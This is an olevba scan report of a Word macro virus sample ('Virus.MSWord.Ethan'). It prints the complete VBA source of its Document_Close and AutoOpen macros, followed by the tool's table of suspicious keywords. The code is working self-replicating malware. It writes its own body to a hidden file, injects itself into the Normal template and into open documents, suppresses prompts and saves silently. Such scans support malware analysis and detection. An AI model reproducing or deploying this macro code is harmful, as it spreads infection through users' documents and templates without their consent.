olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.em-dd832dfa18d07639108c2b99228208e2e6389cfb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.em-dd832dfa18d07639108c2b99228208e2e6389cfb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Rem My Virus Games
    On Error Resume Next
    s = ActiveDocument.Saved
    Application.EnableCancelKey = wdCancelDisabled
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Options.SaveNormalPrompt = False
    If Dir("c:\VirusGame", 6) = "" Then
        Open "C:\VirusGame" For Output As #1
        For i = 2 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
            a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
            Print #1, a
            If a = "Rem Virus game end" Then Exit For
        Next
        Close #1
        SetAttr "C:\VirusGame", 6
    End If
    t = ""
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "Private Sub Document_Close()" Then
        If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "Rem My Virus Games" Then Set t = NormalTemplate.VBProject.VBComponents.Item(1)
    Else
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End Sub"
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Private Sub Document_Close()"
        Set t = NormalTemplate.VBProject.VBComponents.Item(1)
    End If
    If t <> "" Then GoTo Infect
    If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "Private Sub Document_Close()" Then
        If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "Rem My Virus Games" Then Set t = ActiveDocument.VBProject.VBComponents.Item(1)
    Else
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "End Sub"
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Private Sub Document_Close()"
        Set t = ActiveDocument.VBProject.VBComponents.Item(1)
    End If
    
    If t <> "" Then
Infect:
    Open "C:\VirusGame" For Input As #1
    If LOF(1) = 0 Then GoTo Quit
    i = 2
    Do While Not EOF(1)
        Line Input #1, a
        t.CodeModule.InsertLines i, a
        i = i + 1
    Loop
    
Quit:
    Close #1
    If Left(ActiveDocument.Name, 2) <> "文档" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
    Kill "c:\VirusGame"
Rem Virus game end
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Ethan.em-dd832dfa18d07639108c2b99228208e2e6389cfb - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Main()
'Hello
  On Error GoTo 0
  If Not ActiveDocHaveCopied Then
    CopyToActiveDoc
  ElseIf Not NormHaveCopied Then
    CopyToNormal
    Else: MsgBox ("你吃饭了吗？")
  End If
End Sub
Sub CopyToNormal()
  For Each aModule In NormalTemplate.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      IsDblName = True
      Exit For
    End If
  Next aModule
  If IsDblName Then
    With NormalTemplate.VBProject.VBComponents
      .Remove .Item("AutoOpen")
    End With
  End If
  Application.OrganizerCopy Source:=ActiveDocument.FullName, _
       Destination:=NormalTemplate.FullName, _
       Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
  NormalTemplate.Save
End Sub
Sub CopyToActiveDoc()
  For Each aModule In ActiveDocument.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      IsDblName = True
      Exit For
    End If
  Next aModule
  If IsDblName Then
    With ActiveDocument.VBProject.VBComponents
      .Remove .Item("AutoOpen")
    End With
  End If
  Application.OrganizerCopy Source:=NormalTemplate.FullName, _
       Destination:=ActiveDocument.FullName, _
       Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
  ActiveDocument.Save
End Sub
Function NormHaveCopied() As Boolean
  For Each aModule In NormalTemplate.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      If aModule.CodeModule.Lines(2, 1) = "'Hello" Then NormHaveCopied = True
    End If
  Next aModule
End Function
Function ActiveDocHaveCopied() As Boolean
  For Each aModule In ActiveDocument.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      If aModule.CodeModule.Lines(2, 1) = "'Hello" Then ActiveDocHaveCopied = True
    End If
  Next aModule
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
